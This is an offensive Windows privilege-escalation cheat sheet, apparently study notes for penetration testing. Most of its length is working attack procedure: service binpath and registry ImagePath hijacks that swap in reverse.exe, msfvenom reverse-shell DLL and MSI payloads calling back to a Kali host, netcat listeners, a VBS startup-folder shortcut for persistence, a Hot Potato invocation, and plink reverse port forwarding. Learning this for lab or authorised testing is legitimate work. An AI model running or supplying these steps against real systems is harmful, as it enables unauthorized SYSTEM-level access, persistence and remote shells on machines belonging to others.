---
description: Time to break all the things...
---

# Escalation Techniques

## Privilege Escalation Strategy

1. Check your user
2. Run WinPEAS with fast, searchfast, and cmd options
3. Go through a cheatsheet if necessary

Spend some time and read over the results of your enumeration.

If WinPEAS or another tool finds something interesting, make a note of it.

Have a look around for files in your user's Desktop and other common locations such as C:\ and C:\Program Files

Be sure to absolutely read through interesting files that you find as they may contain useful clues and other information that can help you escalate your privileges.

Have a good look at admin processes, enumerate their versions and search for exploits.

Check for internal ports that you might be able to forward to your attacking machine.

If you still do not have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.

This might be a process or file name that you are not familiar with (or even a username).

At this stage, think about kernel exploits.

## Kernel Exploits

### Finding Kernel Exploits

1. Enumerate Windows version/patch level

```
systeminfo
```

2\. Find matching exploits on Google, ExploitDB, and GitHub.

3\. Compile and run.

### Tools

Windows Exploit Suggester

{% embed url="https://github.com/bitsadmin/wesng" %}

Pre-Compiled Kernel Exploits

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

Watson

{% embed url="https://github.com/rasta-mouse/Watson" %}

Syntax:

```
python wes.py /tools/system.info.txt -i 'Elevation of Privilege' --exploits only | more
```

## Service Exploits

Services are simply programs that run in the background.

If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

### Service Commands

Query the configuration of a service:

```
sc.exe qc <name>
```

Query the current status of a service:

```
sc.exe query <name>
```

Modify a configuration option of a service:

```
sc.exe config <name> <option>= <value>
```

Start/Stop a service:

```
net start/stop <name>
```

## Service Misconfigurations

1. <mark style="color:red;">Insecure Service Permissions</mark>
2. <mark style="color:red;">Unquoted Service Path</mark>
3. <mark style="color:red;">Weak Registry Permissions</mark>
4. <mark style="color:red;">Insecure Service Executables</mark>
5. <mark style="color:red;">DLL Hijacking</mark>

### Insecure Service Permissions

Each service has an ACL which defines certain service-specific permissions.

#### Services to look out for:

1. SERVICE\_STOP
2. SERVICE\_START
3. SERVICE\_CHANGE\_CONFIG
4. SERVICE\_ALL\_ACCESS

<mark style="color:yellow;">If our user has permission to change the configuration of a service that runs SYSTEM privileges, we can change the executable the service uses to one of our own!</mark>

* Be careful when doing this because if you CANNOT stop/start the service, you may not be able to apply your changes needed to escalate your privileges.

How to exploit this/use-case

Within the "modifiable services" tab of WinPEAS, you can see services that can be modified.

Use the following method to enumerate the service further to see if/how you can exploit it.

Example service: daclsvc

Access Check:

```
.\accesschk.exe /accepteula -uwcqv user daclsvc
SERVICE_QUERY_STATUS
SERVICE_QUERY_CONFIG
SERVICE_CHANGE_CONFIG
SERVICE_INTERROGATE
SERVICE_ENUMERATE_DEPENDENTS
SERVICE_START
SERVICE_STOP
SERVICE_CONTROL
```

Querying Service Configuration:

```
sc qc daclsvc
START_TYPE    DEMAND_START
BINARY_PATH_NAME    "C:\Program File\DACL Service\daclservice.exe"

```

Querying Current Status of Service:

```
sc query daclsvc
STATE: STOPPED
```

Exploitation Process:

1. Notice how in access check we can see SERVICE\_CHANGE_\__CONFIG this means that we can change anything we see when querying service configuration. This includes the binary path name so why not point the binary path to a reverse shell and simply start the process again?

2\. Apply configuration changes via change binpath

```
sc config daclsvc binpath= "\"C:\..\reverse.exe\""
```

3\. Fire up a Netcat listener in Kali

```
nc -lnvp 53
```

4\. Start the service, once started, this will trigger the reverse shell payload in the new binary path.

```
net start daclsvc
```

### Unquoted Service Path

Executables in Windows can be run without their extension like in Linux.

Essentially, look for a directory where spaces are being used and quotes are not.

This can lead to ambiguity within the Windows environment and we can trick Windows into doing something it shouldn't.

1. Access check on service

```
.\accesschk.exe /accepteula -ucqv user unquotedsvc

.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

2\. Copy reverse shell to this directory

```
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

3\. Fire up a Netcat listener on Kali

```
nc -lnvp 53
```

4\. Start the service

```
net start unquotedsvc
```

### Weak Registry Permissions

The Windows registry stores entries for each service.

How to detect this:

WinPEAS

```
Looking if you can modify any service registry
HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
```

1. Load PowerShell or AccessCheck

```
powershell -exec bypass
```

2\. Get-ACL

```
Get-Acl HKLM\system\currentcontrolset\services\regsvc | Format-List
```

3\. Access Check

```
.\accesschk.exe \accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
```

4\. Can we start the service?

```
.\accesschk.exe /accepteula -ucqv user regsvc
```

5\. Query the registry

```
reg query HKLM\system\currentcontrolset\services\regsvc

ImagePath    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
```

6\. Modify the registry and add a reverse shell to the ImagePath (this has the same effect as modifying binpath).

```
reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\..\reverse.exe /f
```

7\. Fire up a Netcat listener on Kali to catch shell

```
nc -lnvp 53
```

8\. Start the service to trigger the reverse shell

```
net start regsvc
```

### Insecure Service Executables

If the original service executable is modifiable by our user, we can simply replace it with a reverse shell executable.

<mark style="color:yellow;">IF USING ON A REAL SYSTEM: Create a backup of the original executable upon exploitation.</mark>

How to detect:

1. Verify that there is a service executable using WinPEAS

```
filepermsvc (File Permissions Service) File Permissions Everyone [AllAccess]
```

2\. Verify findings with Access Check

```
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

3\. Verify if we can start/stop the service

```
.\accesschk.exe /accepteula -uvqc filepermsvc
SERVICE_START
SERVICE_STOP
```

4\. Backup the Executable

```
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```

5\. Copy reverse shell executable to overwrite original service executable

```
copy /Y C:\..\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

6\. Start a Netcat listener on Kali

```
nc -lnvp 53
```

7\. Start the service to trigger the reverse shell

```
// Some code 
```

### DLL Hijacking

Often a service will try to load functionality from a library called a <mark style="color:yellow;">Dynamic Link Library (DLL)</mark>.

<mark style="color:yellow;">Whatever functionality the DLL provides, will be executed with the SAME privileges as te service that loaded it.</mark>

If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

#### Common Misconfiguration

If a DLL is MISSING from a system, and our user has write access to a directory within the PATH that Windows searches for DLLS in.

<mark style="color:red;">NOTE: This is very difficult and time consuming.</mark>

How to Detect

1. WinPEAS "Checking write permissions in PATH folders (DLL Hijacking)

```
(DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles]
```

2\. Verify that we can start/stop the service

```
accesschk.exe /accepteula -uvqc user dllsvc
```

3\. Confirm executable manually (grab this information from WinPEAS)

```
sc qc dllsvc
```

4\. Generate a DLL-formatted payload for a reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=53 -f dll -o /tools/hijackme.dll
```

5\. Fire up a Netcast listener on Kali

```
nc -lnvp 53
```

6\. Transfer/Copy the reverse shell over into the C:\Temp directory as this is writable in this case

```
copy \\<kali-ip>\tools\hijackme.dll C:\Temp
```

7\. Stop the service and then start the service right after

```
net stop dllsvc
Stopped successfully

net start dllsvc
Starting...
```

## Registry Exploits

### AutoRuns

Windows can be configured to run commands at startup, with elevated privileges.

These "AutoRuns" are configured in the Registry.

If you are able to write to an AutoRun executable, and are able to restart the system, you may be able to escalate privileges.

How to Detect:

WinPEAS

```
AutoRun Applications
\program.exe
FilePerms: Everyone [AllAccess]
RegPath: HKLM\SOFTWARE\Microsoft\Window\CurrentVersion\Run
```

1. Manually query the registry for anything in that RegPath

```
reg query HKLM\SOFTWARE\Microsoft\Window\CurrentVersion\Run
```

2\. Use accesschk to see if the program.exe WinPEAS said was vulnerable&#x20;

```
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
ALL_ACCESS
```

3\. Make a backup of original executable

```
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

4\. Copy the reverse shell executable to overwrite the program.exe

```
copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

5\. Start a Netcat listener

```
nc -lnvp 53
```

6\. Restart Windows and once restarted, you will get a shell.

### AlwaysInstallElevated

MSI files are package files used to install applications.

<mark style="color:yellow;">These files run with the permissions of the user attempting to install them.</mark>

<mark style="color:yellow;">Windows allows for these installers to be run with admin privileges.</mark>

<mark style="color:yellow;">If this is the case, we can generate a malicious MSI file that contains a reverse shell.</mark>

How to Detect

WinPEAS

1. Utilize WinPEAS with windowscreds

```
.\winPEASany.exe quiet windowscreds
Checking AlwaysInstallElevated
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
```

* HKEY-LOCAL-MACHINE (HKLM)
* HKEY-CURRENT-USER (HKCU)

2\. Verify manually by querying registry for these keys

```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 AlwaysInstallElevated REG_DWORD 0x1
 
 
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  
 AlwaysInstallElevated REG_DWORD 0x1
```

3\. To exploit this, we need to create a reverse shell with MSI formatting

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=53 -f msi -o reverse.msi
```

4\. Set up a Netcat listener on Kali

```
nc -lnvp 53
```

5\. Transfer reverse.msi to the Windows machine

6\. Utilize msiexec via CLI to execute the reverse shell

```
msiexec /quiet /qn /i reverse.msi
```

## Scheduled Tasks

Windows can be configured to run tasks at specific times, periodically, or what triggered by an event.

Tasks are ran with the privileges who created them (usually).

However, administrators can configure tasks to be run as other users, including SYSTEM.

#### Commands

List all scheduled tasks your user can see

```
schtasks /query /fo LIST /v
```

PowerShell

```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

* <mark style="color:yellow;">It is very common to rely on clues such as finding a log file or a script that indicates that scheduled task(s) are being run.</mark>
* Once you find the name of the scheduled task, you can accesscheck it.

Did you find a potential scheduled task?

1. Use Access Check to verify vulnerability

```
accesschk.exe /accepteula -quv user CleanUp.ps1
# Ask yourself can you write to this file from the output?
```

2\. Create a Netcat listener

```
nc -lnvp 53
```

3\. Create a backup of the scheduled task

```
copy CleanUp.ps1 C:\Temp
```

4\. Transfer a reverse shell executable to the compromised host in the directory the scheduled task was found (use the same name as the scheduled task for the reverse shell).&#x20;

5\. Wait for the scheduled task to run and you will be granted a shell!

### Startup Apps

Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.

<mark style="color:red;">Windows has a startup directory for apps that should start for all users:</mark>

<mark style="color:yellow;">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</mark>

* If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.&#x20;

How to Detect:

1. Use Access Check to find the permissions in the global startup programs directory&#x20;

```
.\accesscheck.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start Up"
```

2\. A vbs shortcut must be placed here with the contents of a shortcut to your reverse shell file.

* CreateShortcut.vbs (This is the shortcut file)
* reverse.lnk (Link file)
* reverse.exe (reverse shell executable)

Content of CreateShortcut.vbs

```
set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\..\reverse.exe"
oLink.Save
```

3\. Create shortcut

```
cscript CreateShortcut.vbs
```

4\. Set up Netcat Listener

```
nc -lnvp 53
```

5\. Log back into the user. The StartUp app will automatically execute the reverse shell

## Installed Apps

How to Detect

1. Manual enumeration via tasklist

```
tasklist /V
```

2\. Seatbelt Enumeration

```
.\seatbelt.exe NonstandardProcesses
```

3\. WinPEAS

```
.\winPEAS.exe quiet procesinfo
```

* Cross-reference any information you find on sources such as Google and Exploit-DB

## Hot Potato

Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges

#### How does it work?

* The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM
* The NTLM credentials then get relayed to SMB in order to gain command execution
* This attack works on W7, W8, and early W10 and their server counterparts.

How to Detect

1. Start a Netcat listener on Kali

```
nc -lnvp 53
```

2\. Transfer the potato exploit to the compromised host

3\. Execute the command, pointing it to a reverse shell executable, and giving it the following options:

```
.\potato.exe -ip <victim-ip> -cmd "C:\..\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

## Port Forwarding

Sometimes it is naturally easier to run exploit code on Kali but <mark style="color:yellow;">the vulnerable program may be listening on an internal port</mark>.

In these cases, <mark style="color:yellow;">we need to forward a port on Kali to the internal port on Windows</mark>.

We can do this using a program called <mark style="color:yellow;">plink.exe</mark>

How to:

1. Modify the /etc/ssh/sshd\_config file to enable root login

```
PermitRootLogin yes
```

2\. Restart the service

```
service ssh restart
```

3\. Transfer plink.exe over to the compromised Windows host

4\. Run plink.exe

```
.\plink.exe root@<kali> -R 445:127.0.0.1:445
enter password:

#you may need to press enter a few times
```

5\. Now anything you do can go through 127.0.0.1&#x20;

























